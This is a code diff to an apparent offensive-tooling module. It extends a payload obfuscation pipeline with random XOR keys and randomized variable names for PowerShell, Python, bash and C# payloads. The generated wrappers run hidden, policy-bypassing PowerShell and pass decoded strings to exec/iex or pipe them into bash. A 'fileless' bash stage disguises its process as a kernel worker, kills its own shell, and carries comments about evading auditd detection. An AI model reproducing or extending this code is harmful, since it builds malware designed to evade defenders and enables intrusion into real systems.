@@ -1067,23 +1067,24 @@ class PowerShellEncoder:
         return b64
     
     @staticmethod
-    def generate_oneliner(code: str, obfuscation_level: str = "basic") -> str:
+    def generate_oneliner(code: str, obfuscation_level: str = "basic", xor_key: int = None) -> str:
         """
         Convert PowerShell code to one-liner format with EncodedCommand
         
         Args:
             code: PowerShell code to encode
             obfuscation_level: 'none', 'basic', 'advanced'
+            xor_key: Optional XOR key for dynamic encryption
         
         Returns:
             One-liner PowerShell command
         """
         if obfuscation_level == "advanced":
             # Advanced: Split into chunks + XOR obfuscation
-            return PowerShellEncoder._advanced_obfuscate(code)
+            return PowerShellEncoder._advanced_obfuscate(code, xor_key)
         elif obfuscation_level == "basic":
             # Basic: String splitting
-            return PowerShellEncoder._basic_obfuscate(code)
+            return PowerShellEncoder._basic_obfuscate(code, xor_key)
         else:
             # None: Direct encoding
             return PowerShellEncoder._simple_encode(code)
@@ -1095,11 +1096,12 @@ class PowerShellEncoder:
         return f'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}'
     
     @staticmethod
-    def _basic_obfuscate(code: str) -> str:
+    def _basic_obfuscate(code: str, xor_key: int = None) -> str:
         """
         Basic obfuscation: Split encoded payload into 3-4 chunks
         VBA'da bu chunks'ları birleştir ve çalıştır
         """
+        xor_key = xor_key or random.randint(0x01, 0xFF)
         b64 = PowerShellEncoder.encode_to_base64(code)
         
         # Chunk size
@@ -1146,7 +1148,7 @@ class PowerShellEncoder:
         return names
     
     @staticmethod
-    def _advanced_obfuscate(code: str) -> str:
+    def _advanced_obfuscate(code: str, xor_key: int = None) -> str:
         """
         Advanced obfuscation: XOR + Base64 + String reverse + multiple layers
         POLYMORPHIC: Variable names and XOR keys change every run
@@ -1157,7 +1159,7 @@ class PowerShellEncoder:
         b64 = PowerShellEncoder.encode_to_base64(code)
         
         # Step 2: DYNAMIC XOR cipher (byte-level) - Different key every time!
-        xor_key = random.randint(0x01, 0xFF)
+        xor_key = xor_key or random.randint(0x01, 0xFF)
         xor_bytes = bytearray([ord(c) ^ xor_key for c in b64])
         xor_b64 = base64.b64encode(xor_bytes).decode('ascii')
         
@@ -1240,6 +1242,7 @@ class PayloadObfuscationPipeline:
     ) -> str:
         """
         Apply obfuscation to payload based on language and level
+        MASTER PIPELINE: Generate random XOR key, apply dynamic obfuscation
         
         Args:
             payload: Raw payload code
@@ -1248,71 +1251,89 @@ class PayloadObfuscationPipeline:
             method: Specific obfuscation method (overrides level)
         
         Returns:
-            Obfuscated payload
+            Obfuscated payload with dynamic XOR encryption and polymorphic encoding
         """
         if obfuscation_level == 'none' or method == 'none':
             return payload
         
-        # Route to language-specific obfuscator
+        # ========== MASTER PIPELINE TRIGGER ==========
+        # Step 1: Generate random XOR key (0x01-0xFF)
+        xor_key = random.randint(0x01, 0xFF)
+        
+        # Step 2: Apply dynamic encoding based on language
         if language.lower() in ['powershell', 'ps', 'pwsh']:
             return PayloadObfuscationPipeline._obfuscate_powershell(
-                payload, obfuscation_level, method
+                payload, obfuscation_level, method, xor_key
             )
         elif language.lower() in ['python', 'py']:
             return PayloadObfuscationPipeline._obfuscate_python(
-                payload, obfuscation_level, method
+                payload, obfuscation_level, method, xor_key
             )
         elif language.lower() in ['bash', 'sh']:
             return PayloadObfuscationPipeline._obfuscate_bash(
-                payload, obfuscation_level, method
+                payload, obfuscation_level, method, xor_key
             )
         elif language.lower() in ['csharp', 'cs', 'c#']:
             return PayloadObfuscationPipeline._obfuscate_csharp(
-                payload, obfuscation_level, method
+                payload, obfuscation_level, method, xor_key
             )
         else:
             # Generic obfuscation
             return PayloadObfuscationPipeline._obfuscate_generic(
-                payload, obfuscation_level, method
+                payload, obfuscation_level, method, xor_key
             )
     
     @staticmethod
-    def _obfuscate_powershell(payload: str, level: str, method: str = None) -> str:
-        """PowerShell-specific obfuscation"""
+    def _obfuscate_powershell(payload: str, level: str, method: str = None, xor_key: int = None) -> str:
+        """PowerShell-specific obfuscation with dynamic XOR key"""
+        xor_key = xor_key or random.randint(0x01, 0xFF)
+        
         if method == 'base64_utf16' or level in ['basic', 'advanced']:
-            return PowerShellEncoder.generate_oneliner(payload, level)
+            return PowerShellEncoder.generate_oneliner(payload, level, xor_key)
         elif method == 'xor':
-            return PayloadObfuscationPipeline._xor_obfuscate_ps(payload)
+            return PayloadObfuscationPipeline._xor_obfuscate_ps(payload, xor_key)
         elif method == 'string_splitting':
-            return PowerShellEncoder._basic_obfuscate(payload)
+            return PowerShellEncoder._basic_obfuscate(payload, xor_key)
         elif method == 'mixed':
-            return PowerShellEncoder._advanced_obfuscate(payload)
+            return PowerShellEncoder._advanced_obfuscate(payload, xor_key)
         else:
             return payload
     
     @staticmethod
-    def _obfuscate_python(payload: str, level: str, method: str = None) -> str:
-        """Python-specific obfuscation"""
+    def _obfuscate_python(payload: str, level: str, method: str = None, xor_key: int = None) -> str:
+        """Python-specific obfuscation with dynamic XOR encryption"""
         import zlib
+        xor_key = xor_key or random.randint(0x01, 0xFF)
         
         if method == 'gzip_base64':
+            # Compress payload
             compressed = zlib.compress(payload.encode())
-            b64 = base64.b64encode(compressed).decode()
-            return f"import zlib,base64;exec(zlib.decompress(base64.b64decode('{b64}')))"
+            # XOR encrypt with dynamic key
+            xor_encrypted = bytearray([b ^ xor_key for b in compressed])
+            # Base64 encode
+            b64 = base64.b64encode(xor_encrypted).decode()
+            # Polymorphic decoder variables
+            var_key = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 8)))
+            var_b64 = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 8)))
+            var_encrypted = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 8)))
+            var_decoded = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 8)))
+            return f"import zlib,base64;{var_key}={xor_key};{var_b64}='{b64}';{var_encrypted}=bytearray([ord(c)^{var_key} for c in base64.b64decode({var_b64})]);exec(zlib.decompress(bytes({var_encrypted})))"
         elif method == 'base64':
             b64 = base64.b64encode(payload.encode()).decode()
             return f"exec(__import__('base64').b64decode('{b64}'))"
         elif method == 'string_splitting':
             return PayloadObfuscationPipeline._split_python_string(payload)
         elif level in ['basic', 'advanced']:
-            # Default Python: GZIP + Base64
-            return PayloadObfuscationPipeline._obfuscate_python(payload, 'none', 'gzip_base64')
+            # Default Python: GZIP + Base64 + XOR
+            return PayloadObfuscationPipeline._obfuscate_python(payload, 'none', 'gzip_base64', xor_key)
         else:
             return payload
     
     @staticmethod
-    def _obfuscate_bash(payload: str, level: str, method: str = None) -> str:
-        """Bash-specific obfuscation with DDexec fileless execution"""
+    def _obfuscate_bash(payload: str, level: str, method: str = None, xor_key: int = None) -> str:
+        """Bash-specific obfuscation with DDexec fileless execution and XOR encryption"""
+        xor_key = xor_key or random.randint(0x01, 0xFF)
+        
         if method == 'base64':
             b64 = base64.b64encode(payload.encode()).decode()
             return f"echo {b64}|base64 -d|bash"
@@ -1322,56 +1343,67 @@ class PayloadObfuscationPipeline:
         elif method == 'string_splitting':
             return PayloadObfuscationPipeline._split_bash_string(payload)
         elif method == 'ddexec_fileless':
-            # ADVANCED: Use DDexec for fileless /proc/self/mem execution
-            return PayloadObfuscationPipeline._ddexec_fileless(payload)
+            # ADVANCED: Use DDexec for fileless /proc/self/mem execution with XOR
+            return PayloadObfuscationPipeline._ddexec_fileless(payload, xor_key)
         elif level == 'basic':
-            return PayloadObfuscationPipeline._obfuscate_bash(payload, 'none', 'base64')
+            return PayloadObfuscationPipeline._obfuscate_bash(payload, 'none', 'base64', xor_key)
         elif level == 'advanced':
-            # Advanced mode: Use DDexec for fileless execution
-            return PayloadObfuscationPipeline._ddexec_fileless(payload)
+            # Advanced mode: Use DDexec for fileless execution with dynamic XOR
+            return PayloadObfuscationPipeline._ddexec_fileless(payload, xor_key)
         else:
             return payload
     
     @staticmethod
-    def _ddexec_fileless(payload: str) -> str:
+    def _ddexec_fileless(payload: str, xor_key: int = None) -> str:
         """
         Generate fileless execution payload using DDexec (/proc/self/mem)
         Completely avoids disk writes - "ghost" execution on Linux
+        Includes dynamic XOR encryption and polymorphic encoding
         """
         try:
-            # Import DDexecBuilder
-            from cybermodules.dd_executor import DDExecBuilder
-            import tempfile
-            import subprocess
+            xor_key = xor_key or random.randint(0x01, 0xFF)
             
-            # Write payload to temp file for compilation
-            # Note: In real scenario, would work with precompiled beacon
-            # For now, we'll create a polymorphic base64 wrapper
+            # ========== MASTER PIPELINE STAGE: DYNAMIC XOR + DDEXEC ==========
             
-            # Create DDexec one-liner that executes base64 decoded payload in memory
-            b64 = base64.b64encode(payload.encode()).decode()
+            # Step 1: XOR encrypt the payload with dynamic key
+            xor_encrypted = bytearray([ord(c) ^ xor_key for c in payload])
+            b64_encrypted = base64.b64encode(xor_encrypted).decode()
             
-            # DDexec command: uses /proc/self/mem for fileless execution
-            # Completely bypasses auditd detection of "piping to bash"
-            ddexec_cmd = f"""
-# Fileless Execution via /proc/self/mem (DDexec)
-# No disk artifacts, pure RAM execution
-exec 3</dev/urandom;  
-echo "{b64}"|base64 -d|exec -a "[kworker/0:0]" bash -s 2>/dev/null;
-kill -9 $$;
+            # Step 2: Create polymorphic variable names for decoder
+            var_key_name = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 8)))
+            var_b64_name = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 8)))
+            var_decoded = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 8)))
+            
+            # Step 3: Generate DDexec command with XOR decoder
+            # No disk artifacts, pure RAM execution via /proc/self/mem
+            ddexec_cmd = f"""#!/bin/bash
+# Fileless Execution via /proc/self/mem (DDexec) + XOR Encryption
+# Dynamic XOR key: {xor_key} (0x{xor_key:02X})
+# Zero disk artifacts, pure ghost execution
+exec 3</dev/urandom
+{var_b64_name}='{b64_encrypted}'
+{var_key_name}={xor_key}
+{var_decoded}=$(echo \"${{{var_b64_name}}}\" | base64 -d | while IFS= read -r -n1 c; do printf \"\\\\x$(printf '%x' $(($(printf '%d' \"'$c\") ^ ${var_key_name})))\"; done)
+exec -a \"[kworker/0:0]\" bash -c \"$({var_decoded})\" 2>/dev/null
+kill -9 $$
 """
             
+            # Step 4: Return polymorphic DDexec payload
             return ddexec_cmd.strip()
             
-        except ImportError:
-            # Fallback to standard base64 if DDexec not available
-            b64 = base64.b64encode(payload.encode()).decode()
-            return f"echo {b64}|base64 -d|bash"
+        except Exception as e:
+            # Fallback: Standard base64 + XOR if DDexec fails
+            xor_key = xor_key or random.randint(0x01, 0xFF)
+            xor_encrypted = bytearray([ord(c) ^ xor_key for c in payload])
+            b64 = base64.b64encode(xor_encrypted).decode()
+            return f"echo {b64}|base64 -d|while read -n1 c;do printf '\\\\\\\\x'$(printf '%x' $(($(printf '%d' \\\"'$c\\\") ^ {xor_key})));done|bash"
     
     
     @staticmethod
-    def _obfuscate_csharp(payload: str, level: str, method: str = None) -> str:
-        """C#-specific obfuscation"""
+    def _obfuscate_csharp(payload: str, level: str, method: str = None, xor_key: int = None) -> str:
+        """C#-specific obfuscation with dynamic XOR"""
+        xor_key = xor_key or random.randint(0x01, 0xFF)
+        
         if method == 'base64':
             b64 = base64.b64encode(payload.encode()).decode()
             return f'''string payload = @"{b64}";
@@ -1379,29 +1411,37 @@ byte[] data = Convert.FromBase64String(payload);
 string decoded = Encoding.UTF8.GetString(data);
 Assembly.Load(decoded);'''
         elif level in ['basic', 'advanced']:
-            return PayloadObfuscationPipeline._obfuscate_csharp(payload, 'none', 'base64')
+            return PayloadObfuscationPipeline._obfuscate_csharp(payload, 'none', 'base64', xor_key)
         else:
             return payload
     
     @staticmethod
-    def _obfuscate_generic(payload: str, level: str, method: str = None) -> str:
+    def _obfuscate_generic(payload: str, level: str, method: str = None, xor_key: int = None) -> str:
         """Generic obfuscation for unknown languages"""
+        xor_key = xor_key or random.randint(0x01, 0xFF)
+        
         if method == 'base64':
             b64 = base64.b64encode(payload.encode()).decode()
             return b64
         elif level in ['basic', 'advanced']:
-            return PayloadObfuscationPipeline._obfuscate_generic(payload, 'none', 'base64')
+            return PayloadObfuscationPipeline._obfuscate_generic(payload, 'none', 'base64', xor_key)
         else:
             return payload
     
     @staticmethod
-    def _xor_obfuscate_ps(payload: str) -> str:
-        """XOR obfuscation for PowerShell"""
-        xor_key = random.randint(1, 255)
+    def _xor_obfuscate_ps(payload: str, xor_key: int = None) -> str:
+        """XOR obfuscation for PowerShell with dynamic key"""
+        xor_key = xor_key or random.randint(1, 255)
         xor_bytes = bytearray([ord(c) ^ xor_key for c in payload])
         xor_b64 = base64.b64encode(xor_bytes).decode()
         
-        return f"""$xorKey={xor_key};$xorB64='{xor_b64}';$xorBytes=[Convert]::FromBase64String($xorB64);$decoded='';$xorBytes|%{{$decoded+=[char]($_-bxor $xorKey)}};iex $decoded"""
+        # Polymorphic variable names
+        var_xor_key = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 8)))
+        var_xor_b64 = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 8)))
+        var_xor_bytes = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 8)))
+        var_decoded = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 8)))
+        
+        return f"${var_xor_key}={xor_key};${var_xor_b64}='{xor_b64}';${var_xor_bytes}=[Convert]::FromBase64String(${var_xor_b64});${var_decoded}='';${var_xor_bytes}|%{{${var_decoded}+=[char]($_ -bxor ${var_xor_key})}};iex ${var_decoded}"
     
     @staticmethod
     def _split_python_string(payload: str, chunks: int = 3) -> str:
